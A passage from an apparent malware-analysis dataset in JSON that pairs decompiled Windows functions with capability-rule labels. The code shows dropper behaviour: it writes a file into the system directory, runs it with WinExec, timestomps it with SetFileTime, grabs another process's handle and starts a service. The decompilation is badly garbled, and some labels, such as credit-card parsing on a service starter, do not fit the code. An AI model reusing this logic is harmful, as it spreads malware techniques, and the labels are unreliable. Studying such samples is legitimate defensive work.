10) = *(extraout_EDX_01 + 10) + (extraout_CH - cVar13);\n    uStack24239 = 0x4220d4;\n    fcn.00401680();\n    bVar15 = 0xffffffbf < &stack0xffffa151;\n    if ((!bVar15 && *0x10 != 0x5e6f) && (bVar15 || *0x10 == 0x5e6f)) {\n        pcVar7 = uStack24176 >> 8 | uStack24172 << 0x18;\n    }\n    uStack24176 = 0xc;\n    uStack24180 = 0x20;\n    uStack24179 = 0x24;\n    uStack24178 = 0x42;\n    uStack24184 = 9;\n    uStack24183 = 0;\n    uStack24181 = 0;\n    iStack24188 = 0x4220d4;\n    uStack24192 = 0xbc;\n    uStack24191 = 0x31;\n    uStack24190 = 0x40;\n    fcn.00401680();\n    if ((bVar15) || (!bVar15)) {\n        uStack24192 = 4;\n        uStack24191 = 0;\n        uStack24190 = 0;\n        uStack24196 = 0x2c;\n        uStack24195 = 0x24;\n        uStack24194 = 0x42;\n        uStack24193 = 0;\n        uStack24200 = 9;\n        uStack24199 = 0;\n        uStack24198 = 0;\n        uStack24197 = 0;\n    }\n    ppcVar10 = ppuVar9 ^ *(ppuVar9 + 0xe58be73);\n    *(extraout_EDX_02 + 10) = *(extraout_EDX_02 + 10) + extraout_CH_00;\n    ppcStack24204 = 0x4220d4;\n    uStack24208 = 0x4031e0;\n    fcn.00401680();\n    uStack24196 = SUB41(puVar6, 0);\n    uStack24195 = puVar6 >> 8;\n    uStack24194 = puVar6 >> 0x10;\n    uStack24193 = puVar6 >> 0x18;\n    uStack24200 = SUB41(pcVar7, 0);\n    uStack24199 = pcVar7 >> 8;\n    uStack24198 = pcVar7 >> 0x10;\n    uStack24197 = pcVar7 >> 0x18;\n    uVar11 = extraout_DH < 0x36;\n    cVar13 = extraout_DH == 0x36;\n    ppcStack24204 = ppcVar10;\n    iStack24188 = puVar6 + 0x68046a76;\n    while( true ) {\n        uStack24180 = 0x30;\n        uStack24179 = 0x24;\n        uStack24178 = 0x42;\n        uStack24184 = 9;\n        uStack24183 = 0;\n        uStack24181 = 0;\n        uStack24176 = 0x4220d4;\n        uStack24192 = 5;\n        uStack24191 = 0x32;\n        uStack24190 = 0x40;\n        fcn.00401680();\n        if ((uVar11) || (!uVar11)) break;\n        if (extraout_ECX_01 == 1 || cVar13 == '\\0') {\n            *ppcVar10 = pcVar7 + bVar14 * -8 + 4;\n            uStack24192 = in_SS;\n            uStack24191 = in_SS >> 8;\ncode_r0x00403220:\n            uStack24196 = 0x3c;\n            uStack24195 = 0x24;\n            uStack24194 = 0x42;\n            uStack24193 = 0;\n            uStack24200 = 9;\n            uStack24199 = 0;\n            uStack24198 = 0;\n            uStack24197 = 0;\n            ppcStack24204 = 0x4220d4;\n            uStack24208 = 0x403231;\n            fcn.00401680();\n            uStack24180 = 0x54;\n            uStack24179 = 0x24;\n            uStack24178 = 0x42;\n            uStack24184 = 9;\n            uStack24183 = 0;\n            uStack24181 = 0;\n            uStack24176 = 0x4220d4;\n            uStack24192 = 0x66;\n            uStack24191 = 0x32;\n            uStack24190 = 0x40;\n            fcn.00401680();\n            return;\n        }\n    }\n    uStack24192 = 0x16;\n    uStack24191 = 0;\n    uStack24190 = 0;\n    goto code_r0x00403220;\n}\n",
        "token_count": 4650
    },
    "00401220": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401263)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00401220(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00404d20();\n    if (iVar1 == 0) {\n        return false;\n    }\n    fcn.00403520();\n    iVar1 = fcn.00403970(0x422144);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00402ee0();\n    *0x422580 = 1;\n    iVar1 = fcn.00401440();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00404280(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.004046d0(&var_20h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.004017b0(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar1 != 0;\n}\n",
        "token_count": 711
    },
    "00401440": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401440(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004045f0(0x4220e0);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 98
    },
    "004017b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401998) overlaps instruction at (ram,0x00401996)\n// \n// WARNING: Removing unreachable block (ram,0x00401998)\n\nint32_t fcn.004017b0(uint32_t param_1)\n\n{\n    uchar *arg_ch;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint uVar3;\n    uint unaff_EBX;\n    uchar *puVar4;\n    uint *unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar5;\n    uchar uVar6;\n    uchar uVar7;\n    bool bVar8;\n    ulong uVar9;\n    uchar uStack572;\n    uchar uStack571;\n    ushort uStack570;\n    uchar *noname_3;\n    uint noname_4;\n    uint *arg_ch_00;\n    uchar uStack536;\n    uint uStack535;\n    uchar uStack276;\n    uchar auStack275 [259];\n    uint uStack16;\n    uchar auStack12 [8];\n    \n    puVar4 = &stack0xfffffffc;\n    uStack536 = 0;\n    puVar5 = &uStack535;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uStack276 = 0;\n    puVar5 = auStack275;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    uStack16 = 1;\n    *(puVar5 + 2) = 0;\n    uVar6 = 0;\n    uVar7 = 1;\n    noname_3 = &uStack536;\n    noname_4 = 0x104;\n    arg_ch_00 = unaff_ESI;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uStack572 = SUB41(&uStack276, 0);\n    uStack571 = &uStack276 >> 8;\n    uStack570 = &uStack276 >> 0x10;\n    arg_ch = &uStack572;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    if (!uVar6 && !uVar7) {\n        if (uVar6 || uVar7) {\n            *(puVar5 + 3) = *unaff_ESI;\n            param_1 = param_1 & 0xffff0000 | CONCAT11(0xdf, param_1);\n            puVar4 = 0x8de181d1;\n            goto code_r0x0040185f;\n        }\n    }\n    arg_ch = auStack12;\ncode_r0x0040185f:\n    fcn.00401c20(puVar4 + -4, arg_ch);\n    uVar3 = *(puVar4 + 0x10);\n    uStack572 = uVar3;\n    uStack571 = uVar3 >> 8;\n    uStack570 = uVar3 >> 0x10;\n    iVar2 = fcn.00404ef0(param_1, *(puVar4 + 0xc));\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if ((iVar2 < 1) || (0 < iVar2)) {\n        uVar3 = *(puVar4 + -8);\n    }\n    else {\n        *(iVar2 + -0x74c625aa) = *(iVar2 + -0x74c625aa) ^ extraout_ECX;\n        puVar4 = puVar4 + -1;\n        uVar3 = extraout_ECX;\n    }\n    uStack572 = 0xc4;\n    uStack571 = 0x18;\n    uStack570 = 0x40;\n    iVar2 = fcn.00404aa0(puVar4 + -0x110, *(puVar4 + -4), uVar3, noname_3, noname_4, unaff_EDI, arg_ch_00, unaff_EBX);\n    bVar8 = iVar2 == 0;\n    if (bVar8) {\n        return 0;\n    }\n    if ((bVar8) || (!bVar8)) {\n        fcn.00404630();\n    }\n    iVar2 = fcn.00403970(0x422138);\n    if ((iVar2 != -1) || (iVar2 = fcn.00403970(0x42212c),  iVar2 != -1)) {\n        uStack572 = 0x42;\n        uStack571 = 0x19;\n        uStack570 = 0x40;\n        iVar2 = fcn.004045b0(*(puVar4 + 8));\n        if (iVar2 != 0) {\n            fcn.00404040();\n            uStack572 = 0x55;\n            uStack571 = 0x19;\n            uStack570 = 0x40;\n            fcn.00404500();\n            return 1;\n        }\n        if (*0x42257c == 0) {\n            return 0;\n        }\n    }\n    uStack572 = 0x9b;\n    uStack571 = 0x19;\n    uStack570 = 0x40;\n    uVar9 = fcn.004014c0(*(puVar4 + 8), puVar4 + -0x110);\n    // WARNING: Bad instruction - Truncating control flow here\n    if (uVar9 == 0) {\n        *(puVar4 + -0xc) = 0;\n    }\n    uStack572 = uVar9 >> 0x20;\n    uStack571 = uVar9 >> 0x28;\n    uStack570 = uVar9 >> 0x30;\n    iVar2 = *(puVar4 + -0xc);\n    bVar8 = iVar2 == 0;\n    if (!bVar8) {\n        iVar1 = fcn.00402840(*(puVar4 + 8));\n        bVar8 = iVar1 == 0;\n        if (bVar8) {\n            *(puVar4 + -0xc) = 0;\n            iVar2 = iVar1;\n        }\n    }\n    if ((!bVar8) && (bVar8)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (iVar2 == 0) {\n        uStack572 = 0xf8;\n        uStack571 = 0x19;\n        uStack570 = 0x40;\n        iVar2 = fcn.00403b90(*(puVar4 + 8), 0);\n        *(puVar4 + -0xc) = iVar2;\n    }\n    if (iVar2 != 0) {\n        fcn.00404500();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    uStack572 = 0x4c;\n    uStack571 = 0x21;\n    uStack570 = 0x42;\n    (*_sym.imp.KERNEL32.dll_WinExec)();\n    return iVar2;\n}\n",
        "token_count": 1641
    },
    "00403970": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004039bc)\n// WARNING: Removing unreachable block (ram,0x004039c8)\n\nuint __cdecl fcn.00403970(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x422570)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar3 = &var_128h;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x422574)(iVar1, &var_12ch);\n    do {\n        if (iVar2 == 0) {\ncode_r0x00403a25:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00403a25;\n        }\n        iVar2 = (**0x422578)(iVar1, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 373
    },
    "00403a40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403a40(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    uint *puVar10;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar6 = &var_22fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_12ch = '\\0';\n    puVar6 = &var_12bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar4 = 0xffffffff;\n    pcVar8 = &lpBuffer;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    puVar6 = pcVar7 + -uVar4;\n    puVar10 = &var_12ch;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    uVar4 = 0xffffffff;\n    pcVar8 = 0x422118;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    pcVar8 = &var_12ch;\n    do {\n        pcVar9 = pcVar8;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        pcVar9 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar9;\n    } while (cVar1 != '\\0');\n    puVar6 = pcVar7 + -uVar4;\n    puVar10 = pcVar9 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    iVar3 = arg_ch;\n    if ((arg_ch == -1) && (iVar2 = fcn.004045f0(arg_8h),  iVar3 = iVar2,  iVar2 == -1)) {\n        return 0;\n    }\n    if ((!SBORROW4(iVar3, -1)) && (SBORROW4(iVar3, -1))) {\n        LOCK();\n        iVar2 = 0x138b2633;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1221
    },
    "00404470": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404499) overlaps instruction at (ram,0x00404490)\n// \n\nbool fcn.00404470(void)\n\n{\n    int32_t in_EAX;\n    uint *arg_1ch;\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t unaff_ESI;\n    bool bVar3;\n    uint uStack8;\n    \n    puVar2 = &stack0xfffffffc;\n    bVar3 = &stack0xfffffffc < 0x10c;\n    uStack8 = 0x104;\n    if ((bVar3) || (!bVar3)) {\n        arg_1ch = &uStack8;\n    }\n    else {\n        arg_1ch = in_EAX + 0x7c8ecb0d + !bVar3;\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8d27e95e;\n        puVar2 = &stack0xfffffffd;\n    }\n    iVar1 = fcn.00404510(0x80000002, 0x4223c0, 0x422400, puVar2 + -8, puVar2 + -0x10c, arg_1ch);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(puVar2 + -0x10c, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 348
    },
    "004049e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a51) overlaps instruction at (ram,0x00404a4f)\n// \n\nuint __cdecl fcn.004049e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    \n    iVar1 = fcn.00403970(0x42214c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (uVar3 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(uVar3 >> 0x20, uVar3, 0, 0);\n        iVar1 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar1 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00404aa0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b86) overlaps instruction at (ram,0x00404b82)\n// \n\nuint __cdecl\nfcn.00404aa0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h, uint arg_ch, \n            uint arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t arg_8h_00;\n    uint in_ECX;\n    uint extraout_ECX;\n    int32_t *piVar1;\n    uchar **unaff_EBP;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 Var5;\n    ulong uVar6;\n    uint var_4h;\n    uchar auStack8 [4];\n    uchar *puStack4;\n    \n    while( true ) {\n        bVar2 = false;\n        bVar4 = false;\n        bVar3 = (CONCAT11((in_EAX >> 8) - in_ECX, in_EAX + '\\x01') - 1U & 0x637b) == 0;\n        puStack4 = unaff_EBP;\n        in_EAX = fcn.00404470();\n        *0x42257c = in_EAX;\n        if ((bVar2 || bVar3) || (!bVar2 && !bVar3)) break;\n        in_ECX = extraout_ECX;\n        unaff_EBP = &puStack4;\n        if (!bVar4) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(noname_0, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, noname_1, var_4h, auStack8, 0);\n    piVar1 = uVar6 >> 0x20;\n    if (uVar6 == 0) {\n        return 0;\n    }\n    bVar2 = false;\n    Var5 = extraout_ST0;\n    if (*0x42257c != 0) {\n        uVar6 = fcn.004049e0(arg_8h_00);\n        piVar1 = uVar6 >> 0x20;\n        *0x42257c = -(uVar6 != 0);\n        bVar2 = SCARRY4(*0x42257c, 1);\n        *0x42257c = *0x42257c + 1;\n        Var5 = extraout_ST0_00;\n    }\n    if ((bVar2 == *0x42257c < 0) && (bVar2 != *0x42257c < 0)) {\n        *(*0x42257c + -0x7ce92414) = Var5;\n        *piVar1 = *piVar1 + 0x6a57df84;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00403a40(0, arg_8h_00);\n    if (*0x42257c == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 820
    },
    "00404bd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404c11) overlaps instruction at (ram,0x00404c0f)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404bd0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar3;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    char *pcVar4;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t iVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    ulong uVar7;\n    \n    iVar5 = unaff_EDI;\n    uVar7 = (*_sym.imp.MSVCRT.dll__access)(arg_8h);\n    pcVar4 = uVar7 >> 0x20;\n    iVar2 = uVar7;\n    bVar6 = (POPCOUNT(iVar2 + 1U & 0xff) & 1U) != 0;\n    if (iVar2 + 1U == 0) {\n        return 1;\n    }\n    if (bVar6) {\n        if (!bVar6) {\n            out(*unaff_ESI, uVar7 >> 0x20);\n            do {\n                cVar3 = iVar2 >> 8;\n                in_AF = 9 < (iVar2 & 0xf) | in_AF;\n                iVar2 = CONCAT31(CONCAT21(iVar2 >> 0x10, cVar3 - in_AF), -in_AF);\n                iVar5 = unaff_EDI;\n            } while (in_AF || cVar3 == *pcVar4);\n            goto code_r0x00404c0b;\n        }\n    }\n    in_AF = 0;\n    iVar2 = 0;\ncode_r0x00404c0b:\n    piVar1 = iVar5 + pcVar4 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - in_AF;\n    *(extraout_ECX + 0x33) = iVar2;\n    *(iVar5 + 0x5e) = *(iVar5 + 0x5e);\n    return iVar2;\n}\n",
        "token_count": 492
    },
    "00401a60": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a87) overlaps instruction at (ram,0x00401a84)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __fastcall fcn.00401a60(uint param_1, uint8_t param_2, uchar *param_3)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uchar *puVar2;\n    uchar *puVar3;\n    uint *unaff_EDI;\n    bool bVar4;\n    int32_t in_stack_5f9dff5f;\n    uint16_t uStack24;\n    \n    *param_3 = 0x77;\n    do {\n        param_3[1] = 0x82;\n        uStack24 = param_3;\n        param_3[2] = 0x11;\n        param_3[3] = 0x82;\n        bVar4 = (POPCOUNT(param_2 ^ unaff_EBX >> 8 | 0x67) & 1U) == 0;\n        param_3[4] = 0x42;\n        puVar2 = &stack0xfffffffc;\n        puVar3 = param_3;\n        if ((bVar4) || (puVar2 = &stack0xfffffffc,  !bVar4)) goto code_r0x00401b0b;\n        puVar3 = *unaff_EDI;\n        *unaff_EDI = param_3;\n        puVar2 = &stack0xfffffffc + -in_stack_5f9dff5f;\n    } while (puVar2 < 0);\n    if (puVar3 < 0) {\ncode_r0x00401b0b:\n        puVar3[5] = 0x75;\n        puVar3[6] = 0x79;\n        puVar3[7] = 0xc6;\n        puVar3 = *(puVar2 + 8);\n        puVar3[8] = 0x3e;\n        puVar3[9] = 0x6a;\n    }\n    puVar3[10] = 0x1c;\n    puVar3[0xb] = 0x99;\n    *(*(puVar2 + 8) + 0xc) = 0xd6;\n    bVar4 = (uStack24 | 0x31fd) != 0;\n    iVar1 = *(puVar2 + 8);\n    *(iVar1 + 0xd) = 0xb2;\n    if ((bVar4) && (!bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(iVar1 + 0xe) = 0x56;\n    *(iVar1 + 0xf) = 0xf3;\n    **(puVar2 + 0xc) = 0x10;\n    return;\n}\n",
        "token_count": 647
    },
    "00402720": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402720(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00403270": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040343b) overlaps instruction at (ram,0x0040343a)\n// \n// WARNING: Removing unreachable block (ram,0x004033e9)\n\nvoid fcn.00403270(void)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    char extraout_AH;\n    int32_t iVar6;\n    uint8_t extraout_CL;\n    uint8_t extraout_CL_00;\n    char extraout_CH;\n    uint32_t extraout_ECX;\n    uint32_t uVar7;\n    int32_t extraout_ECX_00;\n    uint16_t extraout_DX;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    char cVar8;\n    int32_t unaff_EBX;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    uint16_t in_SS;\n    uint16_t uVar11;\n    uchar uVar12;\n    bool bVar13;\n    char cVar14;\n    char cVar15;\n    ulong uVar16;\n    uint *puStack64;\n    uint32_t uStack60;\n    uint32_t uStack56;\n    int32_t **ppiStack52;\n    int32_t iVar17;\n    \n    iVar17 = unaff_EBX;\n    iVar6 = fcn.00401680();\n    *(iVar6 + 0x6a39da56) = *(iVar6 + 0x6a39da56) ^ extraout_CL;\n    ppiStack52 = 0x4032b2;\n    fcn.00401680();\n    fcn.00401680();\n    cVar8 = unaff_EBX + 1;\n    uVar7 = extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - cVar8, extraout_ECX);\n    uVar12 = uVar7 < extraout_EDX;\n    cVar14 = uVar7 == extraout_EDX;\n    do {\n        fcn.00401680();\n        iVar6 = extraout_ECX_00;\n        if ((uVar12) || (!uVar12)) break;\n        iVar6 = extraout_ECX_00 + -1;\n    } while (iVar6 != 0 && cVar14 != '\\0');\n    iVar3 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    pcVar1 = (iVar3 >> 0x1f) + 9;\n    *pcVar1 = *pcVar1 + (iVar6 >> 8);\n    bVar13 = (POPCOUNT(*pcVar1) & 1U) == 0;\n    ppiStack52 = 0x403334;\n    uVar16 = fcn.00401680();\n    if ((bVar13) || (ppiStack52 = unaff_EDI,  !bVar13)) {\n        ppiStack52 = 0x12;\n        uStack56 = 0x4224d4;\n        uStack60 = 9;\n    }\n    uVar11 = *0x6a17b43a >> 0x20;\n    puVar10 = *0x6a17b43a;\n    pcVar1 = uVar16 + 9;\n    *pcVar1 = *pcVar1 + extraout_CH + *((uVar16 >> 0x20) + -0x2b);\n    puStack64 = 0x4220d4;\n    fcn.00401680();\n    cVar15 = false;\n    cVar14 = '\\0';\n    fcn.00401680();\n    if ((!cVar15) && (cVar15)) {\n        *0x4220d4 = iVar17;\n        return;\n    }\n    ppiStack52 = 0x4033c7;\n    uVar16 = fcn.00401680();\n    uVar7 = uVar16 >> 0x20;\n    if (cVar15 == cVar14) {\n        uVar5 = uVar7 << 0x10;\n        ppiStack52 